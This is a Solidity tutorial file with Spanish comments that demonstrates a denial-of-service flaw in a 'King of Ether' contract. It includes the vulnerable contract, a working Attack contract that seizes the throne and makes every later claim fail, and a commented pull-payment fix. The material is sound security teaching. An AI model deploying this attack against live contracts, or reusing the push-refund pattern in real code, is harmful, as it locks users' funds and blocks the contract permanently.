// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

/*
El objetivo de KingOfEther es convertirse en rey enviando más Ether que
el rey anterior. Al rey anterior se reembolsará con la cantidad de Ether
que envió.
*/

/*
1. Implementar KingOfEther
2. Alice se convierte en rey enviando 1 Ether para reclamar el Trono ().
2. Bob se convierte en rey enviando 2 Ether para reclamar Trono ().
    Alice recibe un reembolso de 1 Ether.
3. Deploy Attack con la dirección de KingOfEther.
4. Llamar al ataque con 3 Ether.
5. El rey actual es el contrato de ataque y nadie puede convertirse en el nuevo rey.

¿Qué sucedió?
El ataque se convirtió en el rey. Todo nuevo desafío para reclamar el trono será rechazado.
Dado que el contrato de ataque no tiene una función de respaldo, se niega a aceptar el
Ether enviado desde KingOfEther antes de que se establezca el nuevo rey.
*/

contract KingOfEther {
    address public king;
    uint256 public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Necesitas pagar mas para ser el REY");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Error al enviar Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}

/*

Técnicas preventivas
Una forma de evitar esto es permitir que los usuarios retiren su Ether en lugar de enviarlo.
Por ejemplo.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

*/

/*

contract KingOfEther {
    address public king;
    uint public balance;
    mapping(address => uint) public balances;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        balances[king] += balance;

        balance = msg.value;
        king = msg.sender;
    }

    function withdraw() public {
        require(msg.sender != king, "Current king cannot withdraw");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

*/
